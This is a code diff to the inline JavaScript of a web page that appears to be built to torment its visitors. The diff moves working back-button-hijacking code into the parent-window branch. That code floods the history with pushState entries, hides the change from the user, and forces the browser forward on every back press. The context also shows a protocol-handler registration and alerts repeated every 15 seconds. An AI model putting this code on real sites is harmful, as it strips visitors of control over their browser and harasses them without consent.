@@ -5,7 +5,7 @@
 <body>
 
 <style>
-  html, body { width: 100%; margin: 0; }
+  html, body { width: 100%; height: 100%; margin: 0; }
   video { width: 100%; height: 100%; }
 </style>
 
@@ -49,19 +49,6 @@
     navigator.registerProtocolHandler('xmpp', handlerUrl, 'haha')
   }
 
-  // Fill up the history so the back button does not work
-  for (let i = 1; i < 20; i++) {
-    window.history.pushState({}, '', window.location.pathname + '?q=' + i)
-  }
-
-  // Set location back to the initial location, so user does not notice
-  window.history.pushState({}, '', window.location.pathname)
-
-  // If user tries to go one page back, go one page forward
-  window.addEventListener('popstate', () => {
-    window.history.forward()
-  })
-
   if (window.opener) {
     // *** RUNS IN CHILD WINDOW: ***
 
@@ -103,6 +90,19 @@
 
   if (!window.opener) {
     // *** RUNS IN PARENT WINDOW: ***
+
+    // Fill up the history so the back button does not work
+    for (let i = 1; i < 20; i++) {
+      window.history.pushState({}, '', window.location.pathname + '?q=' + i)
+    }
+
+    // Set location back to the initial location, so user does not notice
+    window.history.pushState({}, '', window.location.pathname)
+
+    // If user tries to go one page back, go one page forward
+    window.addEventListener('popstate', () => {
+      window.history.forward()
+    })
 
     // Let's have some random alerts, just to mix things up
     setInterval(() => window.alert(Array(100).join('ARE YOU ANNOYED YET? ')), 15000)
